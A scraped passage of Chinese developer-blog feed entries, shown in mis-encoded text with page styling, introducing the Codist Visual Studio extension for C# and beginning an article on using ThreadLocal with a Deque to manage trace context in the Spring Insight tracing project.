.4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>ä»Šå¤©å¤§å§šç»™å¤§å®¶åˆ†äº«ä¸€ä¸ªè‡´åŠ›äºä¸º C# ç¨‹åºå‘˜æä¾›æ›´ä½³çš„ç¼–ç ä½“éªŒå’Œæ•ˆç‡çš„ Visual Studio æ‰©å±•æ’ä»¶ï¼š<strong>Codist</strong>ã€‚</p>
<h2 data-id="heading-1">Codist æ’ä»¶ä»‹ç»</h2>
<p>Codist æ˜¯ä¸€ä¸ªä½¿ç”¨ .NET ç¼–å†™ã€å¼€æºå…è´¹çš„ Visual Studio æ‰©å±•æ’ä»¶ï¼Œè‡´åŠ›äºä¸º C# ç¨‹åºå‘˜æä¾›æ›´å¥½çš„ç¼–ç¨‹ä½“éªŒå’Œç”Ÿäº§æ•ˆç‡ã€‚å®ƒä¸ä»…å¼ºåŒ–äº†è¯­æ³•é«˜äº®ã€å¿«é€Ÿä¿¡æ¯æç¤ºã€å¯¼èˆªæ ã€æ»šåŠ¨æ¡å’Œæ˜¾ç¤ºè´¨é‡ï¼Œè¿˜é›†æˆäº†è‡ªåŠ¨ç‰ˆæœ¬å·æ›´æ–°ã€æ‹¬å·è‡ªåŠ¨è¡¥å…¨ã€æ”¯æŒé«˜çº§ç¼–è¾‘åŠŸèƒ½çš„æ™ºèƒ½å·¥å…·æ ã€ä»£ç åˆ†æç­‰åŠŸèƒ½ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2bca1996341f4afdb76d6ba010fd7c3f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769014216&amp;x-signature=CmGnlw6%2FkJ9xJe9ZfE5xF5%2BDOFw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">æ”¯æŒ Visual Studio ç‰ˆæœ¬</h2>
<ul>
<li>Visual Studio 2026 (amd64)ã€2022 (amd64)ã€2019ã€2017</li>
</ul>
<h2 data-id="heading-3">æ’ä»¶å®‰è£…</h2>
<h3 data-id="heading-4">æ’ä»¶å¸‚åœºä¸‹è½½å®‰è£…</h3>
<ul>
<li>æ’ä»¶å¸‚åœºåœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmarketplace.visualstudio.com%2Fitems%3FitemName%3Dwmj.Codist" target="_blank" title="https://marketplace.visualstudio.com/items?itemName=wmj.Codist" ref="nofollow noopener noreferrer">marketplace.visualstudio.com/items?itemNâ€¦</a></li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d9648f1e92324b0687e3fca91515041a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769014216&amp;x-signature=10n4OuVft2KeXJFgXMFczDe8wqU%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">Visual Studio ç®¡ç†æ‹“å±•å™¨å®‰è£…</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d4fb3e1a77904928b4d7bb185e3877e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769014216&amp;x-signature=jkVLUOwbsg8n7IsEwIwmR4rmays%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1092bde6434846898b1fefd92c1b94c6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769014216&amp;x-signature=bcphbwVNGk5VztEEuiFIZnYhQmI%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-6">æ’ä»¶åŠŸèƒ½</h2>
<h3 data-id="heading-7">é«˜çº§è¯­æ³•é«˜äº®</h3>
<p>é«˜çº§è¯­æ³•é«˜äº®ï¼ˆæ”¯æŒä»»æ„è¯­è¨€ï¼‰ï¼Œä»¥åŠæ³¨é‡Šæ ‡è®°å™¨å¯é«˜äº®æ˜¾ç¤ºç±» TODO é£æ ¼çš„æ³¨é‡Šã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/98a0d4615d3344fba9468c7115df1577~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769014216&amp;x-signature=BKQnifbWSFcYIna9nWb06EFZBC0%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-8">è¶…å¼ºå¿«é€Ÿä¿¡æ¯æç¤º</h3>
<p>è¶…å¼ºå¿«é€Ÿä¿¡æ¯æç¤ºï¼Œæ”¯æŒæ‰©å±•çš„ XML æ–‡æ¡£ã€ç¬¦å·å·¥å…·æç¤ºã€å¯é€‰ä¸­å†…å®¹ã€å¤–è§‚è‡ªå®šä¹‰ç­‰åŠŸèƒ½ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77602fba2aaa40c389821b001875949a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769014216&amp;x-signature=mm1LVP22WvWwGYoTp%2Bwh%2B1skTg0%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-9">å¸¦æ‹–æ”¾åŠŸèƒ½å’Œå¯ç­›é€‰æˆå‘˜åˆ—è¡¨çš„å¯¼èˆªæ </h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd46ecb4a5824a6a907f08a223ec593a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769014216&amp;x-signature=WnGmPqJt2PQ12hgmDr9N8ZPK66g%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-10">æ™ºèƒ½å·¥å…·æ </h3>
<p>æ™ºèƒ½å·¥å…·æ ï¼Œé›†æˆå¸¸ç”¨ç¼–è¾‘å‘½ä»¤ã€C# ä»£ç é‡æ„åŠŸèƒ½åŠç¬¦å·å¼•ç”¨åˆ†æå™¨ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b15f0527a6084cc5942149f2423d6b67~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769014216&amp;x-signature=k9yIuDJTLgF5oegbujQG9kbuasM%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-11">æ»šåŠ¨æ¡æ ‡è®°åŠŸèƒ½</h3>
<p>æ»šåŠ¨æ¡æ ‡è®°ç»˜åˆ¶å¼ºå¤§çš„è¿·ä½ ä»£ç åœ°å›¾ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47c2336e7eb049acb28c8fbd38decb6a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769014216&amp;x-signature=xTlmVp4gXRP%2BfEmjKLhAdcvA5U0%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-12">æ’ä»¶æºä»£ç </h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f088f07804f4384aab02c92c740ef1c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L-96YCQ5pe25YWJ6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769014216&amp;x-signature=wn4ixGmJIqWjngDcMbmnE6Ld38E%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-13">é¡¹ç›®æºç åœ°å€</h2>
<p>æ›´å¤šé¡¹ç›®å®ç”¨åŠŸèƒ½å’Œç‰¹æ€§æ¬¢è¿å‰å¾€é¡¹ç›®å¼€æºåœ°å€æŸ¥çœ‹ğŸ‘€ï¼Œåˆ«å¿˜äº†ç»™é¡¹ç›®ä¸€ä¸ªStaræ”¯æŒğŸ’–ã€‚</p>
<ul>
<li><strong>GitHubå¼€æºåœ°å€ï¼š</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fwmjordan%2FCodist" target="_blank" title="https://github.com/wmjordan/Codist" ref="nofollow noopener noreferrer">github.com/wmjordan/Coâ€¦</a></li>
</ul>
<h2 data-id="heading-14">ä¼˜ç§€é¡¹ç›®å’Œæ¡†æ¶ç²¾é€‰</h2>
<p>è¯¥é¡¹ç›®å·²æ”¶å½•åˆ°C#/.NET/.NET Coreä¼˜ç§€é¡¹ç›®å’Œæ¡†æ¶ç²¾é€‰ä¸­ï¼Œå…³æ³¨ä¼˜ç§€é¡¹ç›®å’Œæ¡†æ¶ç²¾é€‰èƒ½è®©ä½ åŠæ—¶äº†è§£C#ã€.NETå’Œ.NET Coreé¢†åŸŸçš„æœ€æ–°åŠ¨æ€å’Œæœ€ä½³å®è·µï¼Œæé«˜å¼€å‘å·¥ä½œæ•ˆç‡å’Œè´¨é‡ã€‚å‘å·²æŒ–ï¼Œæ¬¢è¿å¤§å®¶è¸Šè·ƒæäº¤PRæ¨èæˆ–è‡ªèï¼ˆ<strong>è®©ä¼˜ç§€çš„é¡¹ç›®å’Œæ¡†æ¶ä¸è¢«åŸ‹æ²¡ğŸ¤</strong>ï¼‰ã€‚</p>
<ul>
<li><strong>GitHubå¼€æºåœ°å€ï¼š</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FYSGStudyHards%2FDotNetGuide%2Fblob%2Fmain%2Fdocs%2FDotNet%2FDotNetProjectPicks.md" target="_blank" title="https://github.com/YSGStudyHards/DotNetGuide/blob/main/docs/DotNet/DotNetProjectPicks.md" ref="nofollow noopener noreferrer">github.com/YSGStudyHarâ€¦</a></li>
<li><strong>Giteeå¼€æºåœ°å€ï¼š</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fysgdaydayup%2FDotNetGuide%2Fblob%2Fmain%2Fdocs%2FDotNet%2FDotNetProjectPicks.md" target="_blank" title="https://gitee.com/ysgdaydayup/DotNetGuide/blob/main/docs/DotNet/DotNetProjectPicks.md" ref="nofollow noopener noreferrer">gitee.com/ysgdaydayupâ€¦</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç”¨ ThreadLocal + Deque æ‰“é€ ä¸€ä¸ªâ€œçº¿ç¨‹ä¸“å±çš„è°ƒç”¨æ ˆâ€ â€”â€” Spring Insight çš„ä¸Šä¸‹æ–‡ç®¡ç†æœ¯]]></title>    <link>https://juejin.cn/post/7595067620949934106</link>    <guid>https://juejin.cn/post/7595067620949934106</guid>    <pubDate>2026-01-14T15:16:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595067620949934106" data-draft-id="7595030559565070387" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç”¨ ThreadLocal + Deque æ‰“é€ ä¸€ä¸ªâ€œçº¿ç¨‹ä¸“å±çš„è°ƒç”¨æ ˆâ€ â€”â€” Spring Insight çš„ä¸Šä¸‹æ–‡ç®¡ç†æœ¯"/> <meta itemprop="keywords" content="åç«¯,Java,æ¶æ„"/> <meta itemprop="datePublished" content="2026-01-14T15:16:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è‹æ¸¡è‹‡"/> <meta itemprop="url" content="https://juejin.cn/user/729731453429159"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç”¨ ThreadLocal + Deque æ‰“é€ ä¸€ä¸ªâ€œçº¿ç¨‹ä¸“å±çš„è°ƒç”¨æ ˆâ€ â€”â€” Spring Insight çš„ä¸Šä¸‹æ–‡ç®¡ç†æœ¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/729731453429159/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è‹æ¸¡è‹‡
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T15:16:56.000Z" title="Wed Jan 14 2026 15:16:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{line-height:1.75;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;letter-spacing:2px;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%;word-break:break-word;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1{font-size:23px;margin-bottom:5px;font-weight:700;padding-left:10px;border-left:5px solid #773098}.markdown-body h2{font-size:19px;font-weight:700;padding-left:10px;border-left:5px solid #916dd5}.markdown-body h3{font-size:17px;font-weight:700;padding-left:10px;border-left:5px solid #d89cf6}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;max-width:100%;margin:1em 0;border-radius:6px;box-shadow:2px 4px 7px #999;user-select:none}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{padding:.2em .5em;font-weight:700;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-size:1em;color:#916dd5;word-break:break-word;overflow-x:auto;background-color:none;border-radius:2px}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-weight:400;font-size:.9em;padding:16px 12px;margin:0;color:#333;word-break:normal;overflow-x:auto;background:#f8f8f8;scroll-behavior:smooth}.markdown-body a{text-decoration:none;color:#916dd5;font-weight:700;border-bottom:1px solid #916dd5}.markdown-body a:active,.markdown-body a:hover{color:#773098}.markdown-body table{display:inline-block!important;font-size:14px;width:auto;max-width:100%;overflow:auto;border:1px solid #916dd5;border-collapse:collapse}.markdown-body thead{background-color:#916dd5;color:#fff;text-align:left}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;border:1px solid #916dd5}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #d89cf6;background-color:#f4eeff}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0;line-height:26px}.markdown-body ol,.markdown-body ul{padding-left:28px;list-style-type:circle}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{color:#916dd5;font-weight:700}.markdown-body b:before,.markdown-body strong:before{content:"ã€Œ"}.markdown-body b:after,.markdown-body strong:after{content:"ã€"}.markdown-body em,.markdown-body i{color:#916dd5}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="an-old-hope">.hljs-comment,.hljs-quote{color:#b6b18b}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#eb3c54}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#e7ce56}.hljs-attribute{color:#ee7c2b}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#4fb4d7}.hljs-section,.hljs-title{color:#78bb65}.hljs-keyword,.hljs-selector-tag{color:#b45ea4}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#1c1d21;color:#c0c5ce}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ç”¨ ThreadLocal + Deque æ‰“é€ ä¸€ä¸ªâ€œçº¿ç¨‹ä¸“å±çš„è°ƒç”¨æ ˆâ€ â€”â€” Spring Insight çš„ä¸Šä¸‹æ–‡ç®¡ç†æœ¯</h2>
<blockquote>
<p><strong>ä½œè€…</strong>ï¼šè‹æ¸¡è‹‡</p>
<p><strong>é¡¹ç›®åœ°å€</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fiweidujiang%2Fspring-insight" target="_blank" title="https://github.com/iweidujiang/spring-insight" ref="nofollow noopener noreferrer">github.com/iweidujiangâ€¦</a>ï¼ˆæ„Ÿè°¢ Star ï¼ï¼‰</p>
</blockquote>
<h3 data-id="heading-1">ä¸€ã€å¼•è¨€</h3>
<p>åœ¨å¼€å‘åˆ†å¸ƒå¼è¿½è¸ªç³»ç»Ÿï¼ˆæ¯”å¦‚ Zipkinã€Jaegerï¼Œæˆ–è€…æˆ‘æ­£åœ¨åšçš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fiweidujiang%2Fspring-insight" target="_blank" title="https://github.com/iweidujiang/spring-insight" ref="nofollow noopener noreferrer">Spring Insight</a>ï¼‰æ—¶ï¼Œæœ‰ä¸€ä¸ªæ ¸å¿ƒé—®é¢˜å¿…é¡»è§£å†³ï¼š</p>
<blockquote>
<p><strong>å¦‚ä½•åœ¨ä¸€ä¸ªè¯·æ±‚çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸä¸­ï¼Œå‡†ç¡®åœ°è®°å½•å®ƒç»è¿‡äº†å“ªäº›æ–¹æ³•ã€æœåŠ¡ã€æ•°æ®åº“ï¼Ÿ</strong></p>
</blockquote>
<p>è€Œè¦å›ç­”è¿™ä¸ªé—®é¢˜ï¼Œå…³é”®åœ¨äºâ€”â€”<strong>è¿½è¸ªä¸Šä¸‹æ–‡ï¼ˆTrace Contextï¼‰</strong> çš„ç®¡ç†ã€‚</p>
<p>ä»Šå¤©ï¼Œæˆ‘ä»¬å°±æ¥èŠèŠ <strong>Spring Insight</strong> ä¸­ä¸€æ®µçœ‹ä¼¼ç®€å•ã€å®åˆ™ç²¾å·§çš„ä»£ç ï¼ˆç‹å©†å–ç“œäº†å±äºæ˜¯ï¼Œå“ˆå“ˆï¼‰ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ThreadLocal&lt;Deque&lt;TraceSpan&gt;&gt; SPAN_STACK =
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">NamedThreadLocal</span>&lt;&gt;(<span class="hljs-string">"Spring Insight Trace Context"</span>) {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">protected</span> Deque&lt;TraceSpan&gt; <span class="hljs-title function_">initialValue</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayDeque</span>&lt;&gt;();
        }
    };
</code></pre>
<p>åˆ«å°çœ‹è¿™çŸ­çŸ­å‡ è¡Œï¼Œå®ƒèƒŒåè—ç€ Java å¹¶å‘ç¼–ç¨‹å’Œé“¾è·¯è¿½è¸ªè®¾è®¡çš„åŒé‡æ™ºæ…§ã€‚</p>
<p>ä¸ºäº†è¯´æ˜æˆ‘ä¸ºä»€ä¹ˆè¿™ä¹ˆå†™ï¼Œæˆ‘ä»¬å…ˆæ·±å…¥è®¤è¯†ä¸€ä¸‹å®ƒçš„ä¸¤ä¸ªâ€œä¸»è§’â€ï¼š<code>ThreadLocal</code> å’Œ <code>Deque</code>ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7cc6148e5f5d43b5b07bb45c199fc0cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5rih6IuH:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769008616&amp;x-signature=S59ipK9C2sqpBa%2FDRorXmqNMTY4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-2">äºŒã€ThreadLocalï¼šæ¯ä¸ªçº¿ç¨‹çš„â€œç§äººä¿é™©ç®±â€</h3>
<h4 data-id="heading-3">ThreadLocal æ˜¯ä»€ä¹ˆï¼Ÿ</h4>
<p><code>ThreadLocal</code> æ˜¯ Java æä¾›çš„ä¸€ä¸ªç±»ï¼Œç”¨äº<strong>ä¸ºæ¯ä¸ªçº¿ç¨‹ç»´æŠ¤ä¸€ä»½ç‹¬ç«‹çš„å˜é‡å‰¯æœ¬</strong>ã€‚</p>
<p>ä½ å¯ä»¥æŠŠå®ƒæƒ³è±¡æˆæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰ä¸€ä¸ªâ€œä¸“å±æŠ½å±‰â€ï¼Œå½¼æ­¤äº’ä¸å¹²æ‰°ã€‚</p>
<pre><code class="hljs language-java" lang="java">ThreadLocal&lt;String&gt; threadLocal = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;();
threadLocal.set(<span class="hljs-string">"Hello from Thread-"</span> + Thread.currentThread().getName());
System.out.println(threadLocal.get()); <span class="hljs-comment">// æ¯ä¸ªçº¿ç¨‹çœ‹åˆ°çš„å€¼éƒ½ä¸åŒ</span>
</code></pre>
<h4 data-id="heading-4">å…¸å‹ä½¿ç”¨åœºæ™¯</h4>
<h5 data-id="heading-5">1. <strong>ç”¨æˆ·ä¼šè¯/å®‰å…¨ä¸Šä¸‹æ–‡ï¼ˆSecurity Contextï¼‰</strong></h5>
<p>åœ¨ <strong>Spring Security</strong> ä¸­ï¼Œ<code>SecurityContextHolder</code> é»˜è®¤å°±ä½¿ç”¨ <code>ThreadLocal</code> å­˜å‚¨å½“å‰ç”¨æˆ·çš„è®¤è¯ä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Authentication</span> <span class="hljs-variable">auth</span> <span class="hljs-operator">=</span> SecurityContextHolder.getContext().getAuthentication();
<span class="hljs-comment">// è¿™ä¸ª auth å¯¹è±¡æ˜¯å½“å‰çº¿ç¨‹ç‹¬æœ‰çš„ï¼Œä¸ä¼šè¢«å…¶ä»–è¯·æ±‚æ±¡æŸ“</span>
</code></pre>
<p>è¿™æ ·ï¼Œåœ¨ Controllerã€Serviceã€DAO å±‚éƒ½èƒ½éšæ—¶è·å–å½“å‰ç”¨æˆ·ï¼Œè€Œæ— éœ€å±‚å±‚ä¼ é€’å‚æ•°ã€‚</p>
<h5 data-id="heading-6">2. <strong>äº‹åŠ¡ç®¡ç†ï¼ˆTransaction Contextï¼‰</strong></h5>
<p><strong>Spring</strong> çš„å£°æ˜å¼äº‹åŠ¡ï¼ˆ<code>@Transactional</code>ï¼‰ä¾èµ– <code>ThreadLocal</code> æ¥ç»‘å®šå½“å‰çº¿ç¨‹çš„æ•°æ®åº“è¿æ¥å’Œäº‹åŠ¡çŠ¶æ€ã€‚</p>
